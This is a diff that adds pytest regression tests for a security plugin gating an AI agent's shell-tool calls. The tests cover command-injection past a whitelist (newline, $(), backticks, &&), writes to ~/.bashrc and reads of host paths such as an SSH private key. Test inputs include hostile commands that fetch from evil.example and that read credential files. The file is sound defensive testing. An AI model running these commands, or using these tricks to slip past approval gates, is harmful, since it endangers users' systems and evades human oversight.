@@ -206,3 +206,151 @@ class TestInvalidRegexRule:
             action, _ = plugin._match_rules("bash_execute", {"command": "rm -rf /x"})
         assert action == "", "非法正则按未命中处理，不得拦截"
         assert any("Invalid regex" in r.getMessage() for r in caplog.records)
+
+
+# ═══════════════════════════════════════════════════════════════
+# 2026-09-17 审查修复 F1/F3：白名单注入面硬化 + 优先级裁决
+# ═══════════════════════════════════════════════════════════════
+
+
+class TestWhitelistInjectionHardening:
+    """safe_commands 字符类禁换行/命令替换/重定向：注入载体不享受 allow。
+
+    回归锚（2026-09-16 规则驱动审查 F1）：`[^&|;]*` 未排除 \\n / $ / 反引号 /
+    括号 / < >，`echo hello⏎curl ...` 与 `echo $(curl ...)` 均命中 allow 短路
+    全部审批——现字符类 `[^&|;\\n$`()<>]*` 令其回落关键词规则照常弹审批。
+    """
+
+    def test_newline_injection_not_masked_by_allow(self) -> None:
+        plugin = _make_plugin()
+        action, rule = plugin._match_rules(
+            "bash_execute", {"command": "echo hello\ncurl http://evil.example/x"}
+        )
+        assert (action, rule) == ("needs_approval", "dangerous_commands")
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "echo $(curl http://evil.example/x)",
+            "echo `curl http://evil.example/x`",
+            "echo before && curl http://evil.example/x",
+        ],
+    )
+    def test_substitution_injection_not_masked_by_allow(self, command: str) -> None:
+        plugin = _make_plugin()
+        action, rule = plugin._match_rules("bash_execute", {"command": command})
+        assert (action, rule) == ("needs_approval", "dangerous_commands")
+
+    def test_redirection_not_whitelisted(self) -> None:
+        """重定向写文件（echo x > file）不再命中 allow——白名单只放行只读形态。"""
+        plugin = _make_plugin()
+        action, _ = plugin._match_rules(
+            "bash_execute", {"command": "echo pwned > ~/.bashrc"}
+        )
+        assert action != "allow"
+
+    def test_plain_read_still_allowed(self) -> None:
+        """良性只读命令照常 allow（硬化不误伤）。"""
+        plugin = _make_plugin()
+        for command in (
+            "ls -la /workspace",
+            "cat notes.txt",
+            "git log --oneline",
+            # URL scheme 的 p:/ 不误命中盘符正则（负向后视），grep URL 照常白名单
+            'grep "http://example.com/api" src/index.ts',
+        ):
+            action, rule = plugin._match_rules("bash_execute", {"command": command})
+            assert (action, rule) == ("allow", "safe_commands"), command
+
+
+class TestHostPathGatePriority:
+    """host_path_access（priority: 1）压过 safe_commands（priority: 0）。
+
+    回归锚（2026-09-16 规则驱动审查 F3）：allow 短路曾令 `ls D:/secret`
+    免审批读宿主任意路径——恰好落入规则注释点名的失效方式。
+    """
+
+    @pytest.mark.parametrize(
+        "args",
+        [
+            {"command": "ls D:/secret"},
+            {"command": "cat C:\\Users\\x\\.ssh\\id_rsa"},
+            {"command": "ls -la", "working_dir": "D:/secret"},
+        ],
+    )
+    def test_drive_path_read_hits_host_path_approval(self, args: dict) -> None:
+        plugin = _make_plugin()
+        action, rule = plugin._match_rules("bash_execute", args)
+        assert (action, rule) == ("needs_approval", "host_path_access")
+
+    def test_posix_path_read_unchanged_by_priority(self) -> None:
+        """非盘符路径不受位置闸影响，白名单照常 allow。"""
+        plugin = _make_plugin()
+        action, rule = plugin._match_rules(
+            "bash_execute", {"command": "ls -la /workspace"}
+        )
+        assert (action, rule) == ("allow", "safe_commands")
+
+
+class TestRulePriorityAdjudication:
+    """引擎优先级裁决的合成规则矩阵（不依赖 yaml 布局）。"""
+
+    @pytest.mark.parametrize(
+        ("reject_action", "reject_priority", "expected"),
+        [
+            ("needs_approval", 0, "allow"),  # 平级：白名单豁免噪音（既有语义）
+            ("block", 0, "allow"),
+            ("needs_approval", 1, "needs_approval"),  # 高优先级闸不被掩蔽
+            ("block", 1, "block"),
+        ],
+    )
+    def test_priority_decides_allow_versus_reject(
+        self, reject_action: str, reject_priority: int, expected: str
+    ) -> None:
+        rules = [
+            {
+                "name": "gate",
+                "tools": ["bash_execute"],
+                "params": ["command"],
+                "action": reject_action,
+                **({"priority": reject_priority} if reject_priority else {}),
+                "patterns": [{"type": "keyword", "value": "probe"}],
+            },
+            {
+                "name": "safe",
+                "tools": ["bash_execute"],
+                "params": ["command"],
+                "action": "allow",
+                "patterns": [{"type": "keyword", "value": "probe"}],
+            },
+        ]
+        plugin = SecurityCheckPlugin(config={"rules": rules})
+        action, rule = plugin._match_rules("bash_execute", {"command": "probe"})
+        assert action == expected
+        assert rule == ("safe" if expected == "allow" else "gate")
+
+    def test_invalid_priority_treated_as_zero_with_warning(
+        self, caplog: pytest.LogCaptureFixture
+    ) -> None:
+        rules = [
+            {
+                "name": "gate_bad_priority",
+                "tools": ["bash_execute"],
+                "params": ["command"],
+                "action": "needs_approval",
+                "priority": "high",
+                "patterns": [{"type": "keyword", "value": "probe"}],
+            },
+            {
+                "name": "safe",
+                "tools": ["bash_execute"],
+                "params": ["command"],
+                "action": "allow",
+                "patterns": [{"type": "keyword", "value": "probe"}],
+            },
+        ]
+        plugin = SecurityCheckPlugin(config={"rules": rules})
+        with caplog.at_level(logging.WARNING, logger="plugin"):
+            action, rule = plugin._match_rules("bash_execute", {"command": "probe"})
+        assert (action, rule) == ("allow", "safe"), "非法 priority 按 0 处理 → 平级 allow"
+        assert any("Invalid priority" in r.getMessage() for r in caplog.records)
